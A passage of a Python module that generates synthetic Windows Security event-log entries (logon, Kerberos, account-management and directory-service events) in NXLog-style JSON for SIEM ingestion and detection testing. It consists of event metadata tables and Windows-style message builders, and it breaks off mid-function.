# modules/windows_events.py
# Simulates Windows Security Event Log entries in the WEC/WEF-rendered JSON
# shape produced by NXLog im_msvistalog / Winlogbeat / XDR Collector.
#
# Dataset (XSIAM):  microsoft_windows_raw
# XSIAM content pack reference:
#   https://cortex.marketplace.pan.dev/marketplace/details/MicrosoftWindowsEvents/
#   (demisto/content Packs/MicrosoftWindowsEvents – Security channel / Provider
#    "Microsoft-Windows-Security-Auditing")
# Transport:        http (XSIAM HTTP Log Collector)
#
# ── Scope (v1) ─────────────────────────────────────────────────────────────
# Only users in config.json whose primary device os_type == "Windows" are
# used.  macOS / Ubuntu / Android users are ignored by this module.  The
# user's Windows `hostname` and `ip` from the session_context is used as the
# event Computer and IpAddress respectively.
#
# ── Event IDs generated ────────────────────────────────────────────────────
# Endpoint (Security channel, Computer = user's workstation):
#   4624  An account was successfully logged on
#   4625  An account failed to log on
#   4634  An account was logged off
#   4647  User initiated logoff
#   4648  A logon was attempted using explicit credentials
#
# Synthetic Domain Controller (Security channel, Computer = "DC01.examplecorp.local"):
#   4740  A user account was locked out
#   4768  A Kerberos authentication ticket (TGT) was requested
#   4769  A Kerberos service ticket was requested
#   4771  Kerberos pre-authentication failed
#   4776  The computer attempted to validate the credentials for an account
#
# ── State awareness ────────────────────────────────────────────────────────
# The module keeps in-memory state per user for the life of the process:
#   • open logon sessions (logon_id → workstation, ip, logon_type, start_time)
#   • password-failure streaks (for lockout pacing)
# Logoff events (4634 / 4647) are ONLY emitted for a TargetLogonId that was
# produced by a prior 4624 in this same process.  Logoff time is always
# minutes-to-hours after the corresponding logon.  Workstation logons are
# paired with a DC 4768 (domain) or 4776 (NTLM) a fraction of a second
# earlier so the cross-host correlation line up in XSIAM UEBA.
#
# ── JSON shape ─────────────────────────────────────────────────────────────
# Every event is a single JSON object whose top-level fields mirror the
# NXLog im_msvistalog flat layout that the XSIAM content pack parses.  The
# EventData fields are merged into the top level (this is what NXLog emits
# by default and what the demisto Security parser expects).  The same
# payload is also repeated inside a nested "EventData" object so modeling
# rules that look at either shape find their fields.
#
# This module only generates synthetic events for log-ingestion and
# detection-rule testing. It never touches a real Windows machine.

import os
import random
import re
import time
import json
import uuid
import base64
import hashlib
import threading
import collections
import functools
import heapq
import itertools
import queue as _queue_mod
from datetime import datetime, timezone, timedelta
from xml.sax.saxutils import escape as _xml_escape

try:
    from lxml import etree as _etree
    _HAS_LXML = True
except ImportError:
    _HAS_LXML = False

try:
    from modules.session_utils import (get_random_user, get_user_by_name, get_random_anon_ip_ctx,
                                        publish_activity, pick_active_session, CORRELATE_PROB,
                                        carry_focus as _carry_focus, focus_user as _focus_user)
except ImportError:
    from session_utils import (get_random_user, get_user_by_name, get_random_anon_ip_ctx,
                               publish_activity, pick_active_session, CORRELATE_PROB,
                               carry_focus as _carry_focus, focus_user as _focus_user)


def _publish_logon(u):
    """Publish a Windows logon as an active session (session start) for cross-plane correlation.

    Inside a worker thread the logon is not out yet: _schedule() moves the result to
    start at now, so its 4624 is stamped up to a few seconds AFTER it was built. A
    publish at build time let a firewall/proxy/DNS consumer emit for the user BEFORE
    their logon (17% of correlated picks, 2-4 s early, measured 2026-10-21). Workers
    therefore hand the publish to _schedule(), which releases it with the result's last
    event; everything else (scenarios, direct calls) publishes immediately."""
    if not u:
        return
    if _deferring():
        pending = getattr(_DEFER_IDS, "publish", None)
        if pending is None:
            pending = _DEFER_IDS.publish = []
        pending.append(u)
        return
    _publish_now(u)


def _publish_now(u, ts=None):
    publish_activity(u.get("username"), private_ip=u.get("ip"), hostname=u.get("hostname"),
                     department=u.get("department"), email=u.get("email"),
                     display_name=u.get("display_name"), ts=ts)


def _pick_windows_user_corr(session_context):
    """Follow-on Windows picker: prefer a currently-active Windows user (correlates to a recent
    logon), else a random Windows user."""
    if session_context and pick_active_session and random.random() < CORRELATE_PROB:
        s = pick_active_session()
        if s:
            wins = _get_windows_users(session_context)
            for w in wins:
                if w.get("username") == s["username"]:
                    return w
    return _pick_windows_user(session_context)


# Required module-level attributes (the auto-loader uses these)

NAME        = "Windows Event Log"
DESCRIPTION = "Simulates Windows Security channel events (4624/4625/4634/4647/4648/4740/4768/4769/4771/4776) in NXLog-style JSON."
XSIAM_VENDOR  = "Microsoft"
XSIAM_PRODUCT = "Windows"
CONFIG_KEY    = "windows_events_config"
NATIVE_TRANSPORT = "wec"
SOURCE_IDENTIFIER = "63b0fbeb501e4650896e7064d3412e14"   # Cribl "Windows Event Logs" -> microsoft_windows_raw
INTEGRATION_IDENTIFIER = "logsim:windows_events"
# generate_log() only DRAINS what the per-host workers buffered; the dashboard rate sets
# Windows VOLUME through set_event_interval() below, not through how often it calls.
# Draining faster than this adds nothing, and at the dashboard's 10,000 calls/s the drain
# loop (each call walks the whole roster in _get_windows_users) held the GIL so the
# workers and the releaser starved: 0 events in 30 s (measured 2026-10-21). The dashboard
# polls no faster than this floor.
MIN_EVENT_INTERVAL = 0.05

# Module-level pacing state
last_threat_event_time = 0

# Set from config at generate_log() time so _build_event can use it
_BUILD_EVENT_OS_SUBTYPE = "Windows 10"


# Static Windows reference data

_PROVIDER_NAME = "Microsoft-Windows-Security-Auditing"
_PROVIDER_GUID = "{54849625-5478-4994-a5ba-3e3b0328c30d}"
_CHANNEL       = "Security"

# Logon types per Microsoft docs for event 4624
# https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4624
_LOGON_TYPE_LABELS = {
    2:  "Interactive",
    3:  "Network",
    4:  "Batch",
    5:  "Service",
    7:  "Unlock",
    8:  "NetworkCleartext",
    9:  "NewCredentials",
    10: "RemoteInteractive",
    11: "CachedInteractive",
    12: "CachedRemoteInteractive",
    13: "CachedUnlock",
}

# Keywords bitmask values Windows emits in the record header.
# 0x8020000000000000 = Audit Success
# 0x8010000000000000 = Audit Failure
_KW_AUDIT_SUCCESS = "0x8020000000000000"
_KW_AUDIT_FAILURE = "0x8010000000000000"

# (EventID → (Task category number, Task name, Version, default-success-or-failure))
# Task numbers pulled from the Security provider manifest on Windows 10/11.
_EVENT_META = {
    4624: {"task": 12544, "category": "Logon",                 "version": 2, "outcome": "success"},
    4625: {"task": 12546, "category": "Logon",                 "version": 0, "outcome": "failure"},
    4634: {"task": 12545, "category": "Logoff",                "version": 0, "outcome": "success"},
    4647: {"task": 12545, "category": "Logoff",                "version": 0, "outcome": "success"},
    4648: {"task": 12544, "category": "Logon",                 "version": 0, "outcome": "success"},
    4740: {"task": 13824, "category": "User Account Management","version": 0, "outcome": "success"},
    4768: {"task": 14339, "category": "Kerberos Authentication Service", "version": 2, "outcome": "success"},
    4769: {"task": 14337, "category": "Kerberos Service Ticket Operations", "version": 2, "outcome": "success"},
    4771: {"task": 14339, "category": "Kerberos Authentication Service", "version": 0, "outcome": "failure"},
    4776: {"task": 14336, "category": "Credential Validation", "version": 0, "outcome": "success"},
    4672: {"task": 12548, "category": "Special Logon",          "version": 0, "outcome": "success"},
    4688: {"task": 13312, "category": "Process Creation",       "version": 2, "outcome": "success"},
    4689: {"task": 13313, "category": "Process Termination",    "version": 0, "outcome": "success"},
    4767: {"task": 13824, "category": "User Account Management","version": 0, "outcome": "success"},
    4662: {"task": 14080, "category": "Directory Service Access","version": 0, "outcome": "success"},
    4656: {"task": 12800, "category": "File System",            "version": 1, "outcome": "success"},
    4663: {"task": 12800, "category": "File System",            "version": 1, "outcome": "success"},
    4741: {"task": 13825, "category": "Computer Account Management","version": 0, "outcome": "success"},
    4742: {"task": 13825, "category": "Computer Account Management","version": 0, "outcome": "success"},
    4781: {"task": 13824, "category": "User Account Management",   "version": 0, "outcome": "success"},
    4728: {"task": 13826, "category": "Security Group Management",   "version": 0, "outcome": "success"},
    4732: {"task": 13826, "category": "Security Group Management",   "version": 0, "outcome": "success"},
    4756: {"task": 13826, "category": "Security Group Management",   "version": 0, "outcome": "success"},
    4729: {"task": 13826, "category": "Security Group Management",   "version": 0, "outcome": "success"},
    4733: {"task": 13826, "category": "Security Group Management",   "version": 0, "outcome": "success"},
    4757: {"task": 13826, "category": "Security Group Management",   "version": 0, "outcome": "success"},
    5136: {"task": 14081, "category": "Directory Service Changes",  "version": 0, "outcome": "success"},
    5137: {"task": 14081, "category": "Directory Service Changes",  "version": 0, "outcome": "success"},
    4886: {"task": 12290, "category": "Certification Services",    "version": 0, "outcome": "success"},
    4887: {"task": 12290, "category": "Certification Services",    "version": 0, "outcome": "success"},
    4888: {"task": 12290, "category": "Certification Services",    "version": 0, "outcome": "failure"},
    4898: {"task": 12293, "category": "Certification Services",    "version": 0, "outcome": "success"},
    4720: {"task": 13824, "category": "User Account Management",   "version": 0, "outcome": "success"},
    4722: {"task": 13824, "category": "User Account Management",   "version": 0, "outcome": "success"},
    4724: {"task": 13824, "category": "User Account Management",   "version": 0, "outcome": "success"},
    4725: {"task": 13824, "category": "User Account Management",   "version": 0, "outcome": "success"},
    4726: {"task": 13824, "category": "User Account Management",   "version": 0, "outcome": "success"},
    4738: {"task": 13824, "category": "User Account Management",   "version": 0, "outcome": "success"},
    4697: {"task": 12805, "category": "Security System Extension",  "version": 0, "outcome": "success"},
    1102: {"task": 104,   "category": "Log clear",                  "version": 0, "outcome": "success"},
    # Forest/domain trust + SID-history (Phase 2 rogue-forest-trust chain)
    4706: {"task": 13568, "category": "Authentication Policy Change", "version": 0, "outcome": "success"},
    4707: {"task": 13568, "category": "Authentication Policy Change", "version": 0, "outcome": "success"},
    4716: {"task": 13568, "category": "Authentication Policy Change", "version": 0, "outcome": "success"},
    4865: {"task": 13568, "category": "Authentication Policy Change", "version": 0, "outcome": "success"},
    4866: {"task": 13568, "category": "Authentication Policy Change", "version": 0, "outcome": "success"},
    4867: {"task": 13568, "category": "Authentication Policy Change", "version": 0, "outcome": "success"},
    4765: {"task": 13824, "category": "User Account Management",     "version": 0, "outcome": "success"},
    4766: {"task": 13824, "category": "User Account Management",     "version": 0, "outcome": "failure"},
    # DCShadow — detailed directory-service replication (rogue DC pushing changes)
    4928: {"task": 14083, "category": "Detailed Directory Service Replication", "version": 0, "outcome": "success"},
    4929: {"task": 14083, "category": "Detailed Directory Service Replication", "version": 0, "outcome": "success"},
    4698: {"task": 12804, "category": "Other Object Access Events", "version": 1, "outcome": "success"},
    4699: {"task": 12804, "category": "Other Object Access Events", "version": 1, "outcome": "success"},
    5140: {"task": 12808, "category": "File Share",                 "version": 1, "outcome": "success"},
    5145: {"task": 12811, "category": "Detailed File Share",        "version": 0, "outcome": "success"},
}

def _format_message(event_id: int, ed: dict) -> str:
    """Build the full Windows-style message text for a given event ID."""
    d = ed
    _b = _MSG_BUILDERS.get(event_id)
    if _b:
        return _b(d)
    return f"Event ID {event_id}"


def _msg_4624(d):
    return (
        "An account was successfully logged on.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Logon Information:\r\n"
        f"\tLogon Type:\t\t{d.get('LogonType','')}\r\n"
        f"\tRestricted Admin Mode:\t{d.get('RestrictedAdminMode','-')}\r\n"
        f"\tVirtual Account:\t\t{d.get('VirtualAccount','')}\r\n"
        f"\tElevated Token:\t\t{d.get('ElevatedToken','')}\r\n\r\n"
        f"Impersonation Level:\t\t{d.get('ImpersonationLevel','')}\r\n\r\n"
        "New Logon:\r\n"
        f"\tSecurity ID:\t\t{d.get('TargetUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('TargetUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('TargetDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('TargetLogonId','')}\r\n"
        f"\tLinked Logon ID:\t\t{d.get('TargetLinkedLogonId','0x0')}\r\n"
        f"\tNetwork Account Name:\t{d.get('TargetOutboundUserName','-')}\r\n"
        f"\tNetwork Account Domain:\t{d.get('TargetOutboundDomainName','-')}\r\n"
        f"\tLogon GUID:\t\t{d.get('LogonGuid','')}\r\n\r\n"
        "Process Information:\r\n"
        f"\tProcess ID:\t\t{d.get('ProcessId','')}\r\n"
        f"\tProcess Name:\t\t{d.get('ProcessName','')}\r\n\r\n"
        "Network Information:\r\n"
        f"\tWorkstation Name:\t{d.get('WorkstationName','')}\r\n"
        f"\tSource Network Address:\t{d.get('IpAddress','')}\r\n"
        f"\tSource Port:\t\t{d.get('IpPort','')}\r\n\r\n"
        "Detailed Authentication Information:\r\n"
        f"\tLogon Process:\t\t{d.get('LogonProcessName','')}\r\n"
        f"\tAuthentication Package:\t{d.get('AuthenticationPackageName','')}\r\n"
        f"\tTransited Services:\t{d.get('TransmittedServices','')}\r\n"
        f"\tPackage Name (NTLM only):\t{d.get('LmPackageName','')}\r\n"
        f"\tKey Length:\t\t{d.get('KeyLength','')}\r\n\r\n"
        "This event is generated when a logon session is created. It is generated on "
        "the computer that was accessed.\r\n\r\n"
        "The subject fields indicate the account on the local system which requested "
        "the logon. This is most commonly a service such as the Server service, or a "
        "local process such as Winlogon.exe or Services.exe.\r\n\r\n"
        "The logon type field indicates the kind of logon that occurred. The most common "
        "types are 2 (interactive) and 3 (network).\r\n\r\n"
        "The New Logon fields indicate the account for whom the new logon was created, "
        "i.e. the account that was logged on.\r\n\r\n"
        "The network fields indicate where a remote logon request originated. Workstation "
        "name is not always available and may be left blank in some cases.\r\n\r\n"
        "The impersonation level field indicates the extent to which a process in the "
        "logon session can impersonate.\r\n\r\n"
        "The authentication information fields provide detailed information about this "
        "specific logon request.\r\n"
        "\t- Logon GUID is a unique identifier that can be used to correlate this event "
        "with a KDC event.\r\n"
        "\t- Transited services indicate which intermediate services have participated in "
        "this logon request.\r\n"
        "\t- Package name indicates which sub-protocol was used among the NTLM protocols.\r\n"
        "\t- Key length indicates the length of the generated session key. This will be 0 "
        "if no session key was requested."
    )


def _msg_4625(d):
    return (
        "An account failed to log on.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Logon Type:\t\t\t{}\r\n\r\n".format(d.get('LogonType','')) +
        "Account For Which Logon Failed:\r\n"
        f"\tSecurity ID:\t\t{d.get('TargetUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('TargetUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('TargetDomainName','')}\r\n\r\n"
        "Failure Information:\r\n"
        f"\tFailure Reason:\t\t{d.get('FailureReason','')}\r\n"
        f"\tStatus:\t\t\t{d.get('Status','')}\r\n"
        f"\tSub Status:\t\t{d.get('SubStatus','')}\r\n\r\n"
        "Process Information:\r\n"
        f"\tCaller Process ID:\t{d.get('ProcessId','')}\r\n"
        f"\tCaller Process Name:\t{d.get('ProcessName','')}\r\n\r\n"
        "Network Information:\r\n"
        f"\tWorkstation Name:\t{d.get('WorkstationName','')}\r\n"
        f"\tSource Network Address:\t{d.get('IpAddress','')}\r\n"
        f"\tSource Port:\t\t{d.get('IpPort','')}\r\n\r\n"
        "Detailed Authentication Information:\r\n"
        f"\tLogon Process:\t\t{d.get('LogonProcessName','')}\r\n"
        f"\tAuthentication Package:\t{d.get('AuthenticationPackageName','')}\r\n"
        f"\tTransited Services:\t{d.get('TransmittedServices','')}\r\n"
        f"\tPackage Name (NTLM only):\t{d.get('LmPackageName','')}\r\n"
        f"\tKey Length:\t\t{d.get('KeyLength','')}\r\n\r\n"
        "The subject fields indicate the account on the local system which requested "
        "the logon. This is most commonly a service such as the Server service, or a "
        "local process such as Winlogon.exe or Services.exe.\r\n\r\n"
        "The Logon Type field indicates the kind of logon that was requested. The most "
        "common types are 2 (interactive) and 3 (network).\r\n\r\n"
        "The Process Information fields indicate which account and process on the system "
        "requested the logon.\r\n\r\n"
        "The Network Information fields indicate where a remote logon request originated. "
        "Workstation name is not always available and may be left blank in some cases.\r\n\r\n"
        "The authentication information fields provide detailed information about this "
        "specific logon request.\r\n"
        "\t- Transited services indicate which intermediate services have participated in "
        "this logon request.\r\n"
        "\t- Package name indicates which sub-protocol was used among the NTLM protocols.\r\n"
        "\t- Key length indicates the length of the generated session key. This will be 0 "
        "if no session key was requested."
    )


def _msg_4634(d):
    return (
        "An account was logged off.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('TargetUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('TargetUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('TargetDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('TargetLogonId','')}\r\n\r\n"
        f"Logon Type:\t\t\t{d.get('LogonType','')}\r\n\r\n"
        "This event is generated when a logon session is destroyed. It may be positively "
        "correlated with a logon event using the Logon ID value. Logon IDs are only unique "
        "between reboots on the same computer."
    )


def _msg_4647(d):
    return (
        "User initiated logoff:\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('TargetUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('TargetUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('TargetDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('TargetLogonId','')}"
    )


def _msg_4648(d):
    return (
        "A logon was attempted using explicit credentials.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n"
        f"\tLogon GUID:\t\t{d.get('LogonGuid','')}\r\n\r\n"
        "Account Whose Credentials Were Used:\r\n"
        f"\tAccount Name:\t\t{d.get('TargetUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('TargetDomainName','')}\r\n"
        f"\tLogon GUID:\t\t{d.get('TargetLogonGuid','')}\r\n\r\n"
        "Target Server:\r\n"
        f"\tTarget Server Name:\t{d.get('TargetServerName','')}\r\n"
        f"\tAdditional Information:\t{d.get('TargetInfo','')}\r\n\r\n"
        "Process Information:\r\n"
        f"\tProcess ID:\t\t{d.get('ProcessId','')}\r\n"
        f"\tProcess Name:\t\t{d.get('ProcessName','')}\r\n\r\n"
        "Network Information:\r\n"
        f"\tNetwork Address:\t{d.get('IpAddress','')}\r\n"
        f"\tPort:\t\t\t{d.get('IpPort','')}\r\n\r\n"
        "This event is generated when a process attempts to log on an account by "
        "explicitly specifying that account's credentials.  This most commonly occurs "
        "in batch-type configurations such as scheduled tasks, or when using the "
        "RUNAS command."
    )


def _msg_4740(d):
    return (
        "A user account was locked out.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Account That Was Locked Out:\r\n"
        f"\tSecurity ID:\t\t{d.get('TargetSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('TargetUserName','')}\r\n\r\n"
        "Additional Information:\r\n"
        f"\tCaller Computer Name:\t{d.get('TargetDomainName','')}"
    )


def _msg_4768(d):
    domain_dns = d.get('TargetDomainName', '')
    domain_nb = domain_dns.split('.')[0].upper() if '.' in domain_dns else domain_dns
    acct = d.get('TargetUserName', '').split('@')[0]
    user_id = f"{domain_nb}\\{acct}" if domain_nb else d.get('TargetSid', '')
    svc_name = d.get('ServiceName', '')
    svc_id = f"{domain_nb}\\{svc_name}" if domain_nb else d.get('ServiceSid', '')
    return (
        "A Kerberos authentication ticket (TGT) was requested.\r\n\r\n"
        "Account Information:\r\n"
        f"\tAccount Name:\t\t{d.get('TargetUserName','')}\r\n"
        f"\tSupplied Realm Name:\t{domain_dns}\r\n"
        f"\tUser ID:\t\t\t{user_id}\r\n\r\n"
        "Service Information:\r\n"
        f"\tService Name:\t\t{svc_name}\r\n"
        f"\tService ID:\t\t{svc_id}\r\n\r\n"
        "Network Information:\r\n"
        f"\tClient Address:\t\t{d.get('IpAddress','')}\r\n"
        f"\tClient Port:\t\t{d.get('IpPort','')}\r\n\r\n"
        "Additional Information:\r\n"
        f"\tTicket Options:\t\t{d.get('TicketOptions','')}\r\n"
        f"\tResult Code:\t\t{d.get('Status','')}\r\n"
        f"\tTicket Encryption Type:\t{d.get('TicketEncryptionType','')}\r\n"
        f"\tPre-Authentication Type:\t{d.get('PreAuthType','')}\r\n\r\n"
        "Certificate Information:\r\n"
        f"\tCertificate Issuer Name:\t\t{d.get('CertIssuerName','')}\r\n"
        f"\tCertificate Serial Number:\t{d.get('CertSerialNumber','')}\r\n"
        f"\tCertificate Thumbprint:\t\t{d.get('CertThumbprint','')}\r\n\r\n"
        "Certificate information is only provided if a certificate was used for "
        "pre-authentication.\r\n\r\n"
        "Pre-authentication types, ticket options, encryption types and result codes "
        "are defined in RFC 4120."
    )


def _msg_4769(d):
    return (
        "A Kerberos service ticket was requested.\r\n\r\n"
        "Account Information:\r\n"
        f"\tAccount Name:\t\t{d.get('TargetUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('TargetDomainName','')}\r\n"
        f"\tLogon GUID:\t\t{d.get('LogonGuid','')}\r\n\r\n"
        "Service Information:\r\n"
        f"\tService Name:\t\t{d.get('ServiceName','')}\r\n"
        f"\tService ID:\t\t{d.get('ServiceSid','')}\r\n\r\n"
        "Network Information:\r\n"
        f"\tClient Address:\t\t{d.get('IpAddress','')}\r\n"
        f"\tClient Port:\t\t{d.get('IpPort','')}\r\n\r\n"
        "Additional Information:\r\n"
        f"\tTicket Options:\t\t{d.get('TicketOptions','')}\r\n"
        f"\tTicket Encryption Type:\t{d.get('TicketEncryptionType','')}\r\n"
        f"\tFailure Code:\t\t{d.get('Status','')}\r\n"
        f"\tTransited Services:\t{d.get('TransmittedServices','')}\r\n\r\n"
        "This event is generated every time access is requested to a resource such as a "
        "computer or a Windows service.  The service name indicates the resource to which "
        "access was requested.\r\n\r\n"
        "This event can be correlated with Windows logon events by comparing the Logon GUID "
        "fields in each event.  The logon event occurs on the machine that was accessed, "
        "which is often a different machine than the domain controller which issued the "
        "service ticket.\r\n\r\n"
        "Ticket options, encryption types, and failure codes are defined in RFC 4120."
    )


def _msg_4771(d):
    return (
        "Kerberos pre-authentication failed.\r\n\r\n"
        "Account Information:\r\n"
        f"\tSecurity ID:\t\t{d.get('TargetSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('TargetUserName','')}\r\n\r\n"
        "Service Information:\r\n"
        f"\tService Name:\t\t{d.get('ServiceName','')}\r\n\r\n"
        "Network Information:\r\n"
        f"\tClient Address:\t\t{d.get('IpAddress','')}\r\n"
        f"\tClient Port:\t\t{d.get('IpPort','')}\r\n\r\n"
        "Additional Information:\r\n"
        f"\tTicket Options:\t\t{d.get('TicketOptions','')}\r\n"
        f"\tFailure Code:\t\t{d.get('Status','')}\r\n"
        f"\tPre-Authentication Type:\t{d.get('PreAuthType','')}\r\n\r\n"
        "Certificate Information:\r\n"
        f"\tCertificate Issuer Name:\t\t{d.get('CertIssuerName','')}\r\n"
        f"\tCertificate Serial Number:\t{d.get('CertSerialNumber','')}\r\n"
        f"\tCertificate Thumbprint:\t\t{d.get('CertThumbprint','')}"
    )


def _msg_4776(d):
    return (
        "The computer attempted to validate the credentials for an account.\r\n\r\n"
        f"Authentication Package:\t{d.get('PackageName','MICROSOFT_AUTHENTICATION_PACKAGE_V1_0')}\r\n"
        f"Logon Account:\t\t{d.get('TargetUserName','')}\r\n"
        f"Source Workstation:\t{d.get('Workstation','')}\r\n"
        f"Error Code:\t\t{d.get('Status','')}"
    )


def _msg_4672(d):
    raw = d.get('PrivilegeList', '')
    privs_fmt = "\r\n\t\t\t".join(raw.split()) if raw else raw
    return (
        "Special privileges assigned to new logon.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        f"Privileges:\t\t{privs_fmt}"
    )


def _msg_4688(d):
    return (
        "A new process has been created.\r\n\r\n"
        "Creator Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Target Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('TargetUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('TargetUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('TargetDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('TargetLogonId','')}\r\n\r\n"
        "Process Information:\r\n"
        f"\tNew Process ID:\t\t{d.get('NewProcessId','')}\r\n"
        f"\tNew Process Name:\t{d.get('NewProcessName','')}\r\n"
        f"\tToken Elevation Type:\t{d.get('TokenElevationType','')}\r\n"
        f"\tMandatory Label:\t\t{d.get('MandatoryLabel','')}\r\n"
        f"\tCreator Process ID:\t{d.get('ProcessId','')}\r\n"
        f"\tCreator Process Name:\t{d.get('ParentProcessName','')}\r\n"
        f"\tProcess Command Line:\t{d.get('CommandLine','')}"
    )


def _msg_4689(d):
    return (
        "A process has exited.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Process Information:\r\n"
        f"\tProcess ID:\t{d.get('ProcessId','')}\r\n"
        f"\tProcess Name:\t{d.get('ProcessName','')}\r\n"
        f"\tExit Status:\t{d.get('Status','0x0')}"
    )


def _msg_4767(d):
    return (
        "A user account was unlocked.\r\n\r\n"
        "Subject:\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Target Account:\r\n"
        f"\tSecurity ID:\t\t{d.get('TargetSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('TargetUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('TargetDomainName','')}"
    )


# Access mask -> "Accesses:" display name. Values per the Active Directory Access Codes
# and Rights table in the Microsoft reference for event 4662.
_ACCESS_MASK_TO_NAME = {
    "0x1":     "Create Child",
    "0x2":     "Delete Child",
    "0x4":     "List Contents",
    "0x8":     "Write Self",
    "0x10":    "Read Property",
    "0x20":    "Write Property",
    "0x40":    "Delete Tree",
    "0x80":    "List Object",
    "0x100":   "Control Access",
    "0x10000": "DELETE",
    "0x20000": "READ_CONTROL",
    "0x40000": "WRITE_DAC",
    "0x80000": "WRITE_OWNER",
}


# msobjs.dll message codes used in the AccessList / Properties fields. Directory-service
# rights live in the %%768x range; standard rights in %%153x. The previous table conflated
# the two, so a Read Property access was emitted as "%%1537" (DELETE).
_PROP_CODE_TO_NAME = {
    "%%7680": "Create Child",
    "%%7681": "Delete Child",
    "%%7682": "List Contents",
    "%%7683": "Write Self",
    "%%7684": "Read Property",
    "%%7685": "Write Property",
    "%%7686": "Delete Tree",
    "%%7687": "List Object",
    "%%7688": "Control Access",
    "%%1537": "DELETE",
    "%%1538": "READ_CONTROL",
    "%%1539": "WRITE_DAC",
    "%%1540": "WRITE_OWNER",
    "%%5649": "Query secret value",
}


def _msg_4662(d):
    accesses = _ACCESS_MASK_TO_NAME.get(d.get('AccessMask', ''), 'Control Access')
    props_raw = d.get('Properties', '')
    props_rendered = props_raw
    for code, name in _PROP_CODE_TO_NAME.items():
        props_rendered = props_rendered.replace(code, name)
    return (
        "An operation was performed on an object.\r\n\r\n"
        "Subject :\r\n"
        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
        "Object:\r\n"
        f"\tObject Server:\t\tDS\r\n"
        f"\tObject Type:\t\t{d.get('ObjectType','')}\r\n"
        f"\tObject Name:\t\t{d.get('ObjectName','')}\r\n"
        f"\tHandle ID:\t\t{d.get('HandleId','0x0')}\r\n\r\n"
        "Operation:\r\n"
        f"\tOperation Type:\t\t{d.get('OperationType','Object Access')}\r\n"
        f"\tAccesses:\t\t{accesses}\r\n"
        f"\t\t\t\t\r\n"
        f"\tAccess Mask:\t\t{d.get('AccessMask','')}\r\n"
        f"\tProperties:\t\t{props_rendered}\r\n\r\n"
        "Additional Information:\r\n"
        f"\tParameter 1:\t\t{d.get('AdditionalInfo','-')}\r\n"
        f"\tParameter 2:\t\t"
    )


def _msg_4656(d):
    return (
